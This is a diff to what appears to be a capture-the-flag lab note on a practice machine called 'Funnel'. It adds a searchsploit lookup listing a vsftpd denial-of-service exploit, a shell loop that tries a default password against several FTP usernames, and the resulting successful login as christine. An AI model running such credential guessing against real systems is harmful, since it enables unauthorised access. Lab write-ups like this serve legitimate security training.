@@ -46,7 +46,18 @@ ftp> exit
 
 See the [[Funnel/10 - Loot/10 - Loot|10 - Loot]] note for potential accounts and a password policy PDF.
 
+searchsploit pulls up info for DOS
+```
+┌──(kali㉿kali)-[~]
+└─$ searchsploit vsftpd 3.0.3
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                             |  Path
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 3.0.3 - Remote Denial of Service                                                                                    | multiple/remote/49719.py
+--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
 
+```
 ### Check FTP access for users with default creds
 - root
 - optimus
@@ -55,3 +66,54 @@ See the [[Funnel/10 - Loot/10 - Loot|10 - Loot]] note for potential accounts and
 - christine
 - maria
 - Default password to try: funnel123#!#
+
+```
+┌──(kali㉿kali)-[~]
+└─$ for user in root optimus albert andreas christine maria; do ftp "$user@10.129.230.135"; done
+Connected to 10.129.230.135.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> exit
+221 Goodbye.
+Connected to 10.129.230.135.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> exit
+221 Goodbye.
+Connected to 10.129.230.135.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> exit
+221 Goodbye.
+Connected to 10.129.230.135.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> exit
+221 Goodbye.
+Connected to 10.129.230.135.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||35419|)
+150 Here comes the directory listing.
+226 Directory send OK.
+
+```
+
+FTP: christine has password funnel123#!# but no files are present
